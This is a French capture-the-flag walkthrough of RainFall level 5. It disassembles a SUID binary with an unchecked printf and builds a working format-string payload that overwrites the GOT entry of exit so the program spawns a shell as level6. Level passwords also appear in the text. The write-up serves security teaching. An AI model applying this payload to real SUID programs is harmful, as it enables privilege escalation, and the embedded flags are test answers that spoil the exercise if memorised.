## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level4
  $ ssh level5@127.0.0.1 -p 4242
      _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  level5@127.0.0.1's password 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
    GCC stack protector support:            Enabled
    Strict user copy checks:                Disabled
    Restrict /dev/mem access:               Enabled
    Restrict /dev/kmem access:              Enabled
    grsecurity / PaX: No GRKERNSEC
    Kernel Heap Hardening: No KERNHEAP
  System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
  level5@RainFall:~$
  
  # On regarde ce qu'on a
  level5@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
    -rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
    -rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile

  # On teste les arguments
  level5@RainFall:~$ ./level5
    asdfasdf
    asdfasdf
  level5@RainFall:~$ ./level5
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
  level5@RainFall:~$ ./level5
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUESTRING SUPER LOOOOOOOOOOOOOOOOO
  ```
  * Comme le level4 :D
  * On a un binaire appartenant a level5 dans le home avec les droits SUID...
  * ... qui demande un input ...
  * ... qui print l'input ...
  * ... qui segfault pas ...
  * ... puisqu'il protège l'input: tout l'input n'est pas print. Ouvrons lui le ventre ...


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level5@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level5@RainFall:/tmp$ gdb ~/level5
      [...]
      Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    Non-debugging symbols:
      0x08048334  _init
      0x08048380  printf
      0x08048380  printf@plt
      0x08048390  _exit
      0x08048390  _exit@plt
      0x080483a0  fgets
      0x080483a0  fgets@plt
      0x080483b0  system
      0x080483b0  system@plt
      0x080483c0  __gmon_start__
      0x080483c0  __gmon_start__@plt
      0x080483d0  exit
      0x080483d0  exit@plt
      0x080483e0  __libc_start_main
      0x080483e0  __libc_start_main@plt
      0x080483f0  _start
      0x08048420  __do_global_dtors_aux
      0x08048480  frame_dummy # Func frame_dummy
      0x080484a4  o           # Func o
      0x080484c2  n           # Func n
      0x08048504  main        # Func main
      0x08048520  __libc_csu_init
      0x08048590  __libc_csu_fini
      0x08048592  __i686.get_pc_thunk.bx
      0x080485a0  __do_global_ctors_aux
      0x080485cc  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8049848
      0x8049848 <stdin@@GLIBC_2.0>:	 ""

    gdb-peda$ x/s 0x80485f0
      0x80485f0:	 "/bin/sh"    
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Comme dans le level2 et 3 et 4, on call n et c'est tout
      0x08048504 <+0>:	push   ebp
      0x08048505 <+1>:	mov    ebp,esp
      0x08048507 <+3>:	and    esp,0xfffffff0
      0x0804850a <+6>:	call   0x80484c2 <n>
      0x0804850f <+11>:	leave
      0x08048510 <+12>:	ret
      End of assembler dump.
  ```

  * Ok, donc on a un main qui call n et return. Regardons n.
  ```shell
    gdb-peda$ pdisas n
      Dump of assembler code for function n:
      # Comme dans l'exo precedent, allocation de 536
      0x080484c2 <+0>:	push   ebp
      0x080484c3 <+1>:	mov    ebp,esp
      0x080484c5 <+3>:	sub    esp,0x218

      # Comme dans le level3 et 4, Call fgets(buffer[520], 512, stdin)
      0x080484cb <+9>:	mov    eax,ds:0x8049848           # On met stdin dans eax
      0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax    # On push eax (stdin) sur la stack
      0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200  # On push 512 sur la stack
      0x080484dc <+26>:	lea    eax,[ebp-0x208]            # On déplace eax sur EBP - 520
      0x080484e2 <+32>:	mov    DWORD PTR [esp],eax        # On push eax (EBP - 520) sur la stack
      0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>      # On call fgets avec ces arguments

      # Comme le level3 printf(buffer[520])
      0x080484ea <+40>:	lea    eax,[ebp-0x208]        # On déplace eax sur le debut de notre buffer
      0x080484f0 <+46>:	mov    DWORD PTR [esp],eax    # On push eax (buffer[520]) sur la stack
      0x080484f3 <+49>:	call   0x8048380 <printf@plt> # On call printf avec notre input

      # Call exit(1)
      0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1  # Push 1 sur la stack
      0x080484ff <+61>:	call   0x80483d0 <exit@plt> # Call exit avec cet argument
  ```

  * Les différences comparé au level3 sont que l'on ne check pas une globale dans cette premiere fonction.
  * On ne call pas o. Regardons o...

  ```shell
  gdb-peda$ pdisas p
    Dump of assembler code for function o:
    # Initialisation et allocation de 24 octets
    0x080484a4 <+0>:	push   ebp
    0x080484a5 <+1>:	mov    ebp,esp
    0x080484a7 <+3>:	sub    esp,0x18

    # Call system("/bin/sh")
    0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0  # On push "/bin/sh" sur la stack
    0x080484b1 <+13>:	call   0x80483b0 <system@plt>     # On call system

    # Call exit(1)
    0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1        # On push 1 sur la stack
    0x080484bd <+25>:	call   0x8048390 <_exit@plt>      # On exit
    End of assembler dump.
  ```

  * On voit que o nous pop un shell, dommage on ne le call nulle part et on ne peut pas réécrire sur l'EIP puisque toutes les fonctions call exit

## 2: Comportement
> Une fois recomposé, on comprend que le main call juste n.\
> n, quand à elle, print et exit mais n'appelle pas...\
> ...o, qui nous pop un shell.\

## 3: Exploit

### A: Explication

> On va grâce au printf non protégé, non pas réécrire sur une globale ou un EIP mais on va réécrire dans la Global Offset Table (GOT).\
> La GOT est une table de référence sur les fonctions des librairies utilisées dans le code.\
> On va donc réécrire la référence de exit pour pointer sur o à la place.
> Donc même exploit, mais pas la même zone pour réécrire

### B: Creation de l'exploit

* Il nous faut donc: l'adresse de o, à partir de combien de parametres on va lire le debut de notre string, et l'addresse de la référence de exit dans la GOT

```shell
  # Addresse de m (vu pendant l'analyse)
  gdb-peda$ info function o
    [...]
    0x080484a4  o
    [...]

  # On teste au bout de combien de paramètres on retombe sur nos AAAA
  level4@RainFall:/tmp$ python -c 'print "AAAA " + "%x " * 10' | ~/level5
    AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078
  # Pouf! 4ème argument

  # On cherche l'addresse de exit
  level5@RainFall:/tmp$ objdump -R ~/level5
    /home/user/level5/level5:     file format elf32-i386
    DYNAMIC RELOCATION RECORDS
    OFFSET   TYPE              VALUE
    08049814 R_386_GLOB_DAT    __gmon_start__
    08049848 R_386_COPY        stdin
    08049824 R_386_JUMP_SLOT   printf
    08049828 R_386_JUMP_SLOT   _exit
    0804982c R_386_JUMP_SLOT   fgets
    08049830 R_386_JUMP_SLOT   system
    08049834 R_386_JUMP_SLOT   __gmon_start__
    08049838 R_386_JUMP_SLOT   exit # POUF 
    0804983c R_386_JUMP_SLOT   __libc_start_main

```

* On a donc tous les prérequis. En transformant en little indian l'addresse de o(\x38\x98\x04\x08), on va pouvoir construire la string suivante:

```shell
  level5@RainFall:/tmp$ python -c 'print "\x38\x98\x04\x08%1$" + str(int(0x080484a4) - 4) + "d%4$n"' > pattern5
```

* On utilise la representation en int de cette addresse

```shell
level5@RainFall:/tmp$ cat /tmp/pattern5 - | ~/level5 # ...2 HOURS later...
  [...]512
whoami
  level6
cat /home/user/level6/.pass
  d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
